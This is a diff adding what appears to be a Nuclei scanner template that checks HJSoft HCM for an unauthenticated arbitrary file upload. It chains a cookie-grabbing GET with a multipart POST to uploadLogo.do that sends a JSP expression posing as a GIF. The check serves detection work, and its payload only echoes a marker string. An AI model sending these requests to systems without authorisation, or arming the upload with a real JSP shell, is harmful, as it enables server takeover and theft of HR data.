@@ -1,0 +1,66 @@
+id: hjsoft-hcm-uploadLogo-fileupload
+
+info:
+  name: HJSoft HCM uploadLogo - File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    该漏洞分为3步
+    第一步通过/module/system/qrcard/mobilewrite/qrcardmain.jsp接口获取有效Cookie.
+    第二步通过/sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1获取到document.getElementById("pathvalue").value=中的上传路径.
+    第三部设置path值，通过步骤二接口上传.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFOA/%E5%AE%8F%E6%99%AF%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FuploadLogo%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+  tags: HJSoft-HCM
+
+http:
+  - raw:
+      - |
+        GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: get_cookie
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - "Set-Cookie: (.+?);"
+
+  - raw:
+      - |
+        POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+        Cookie: {{get_cookie}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="path"
+
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="lfType"
+
+        0
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="logofile"; filename=""
+        Content-Type: image/gif
+
+        <%= "bttest1" %>
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="twoFile"; filename=""
+        Content-Type: image/gif
+
+        <%= "bttest1" %>
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r--
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, '/sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=0')"
+        condition: and
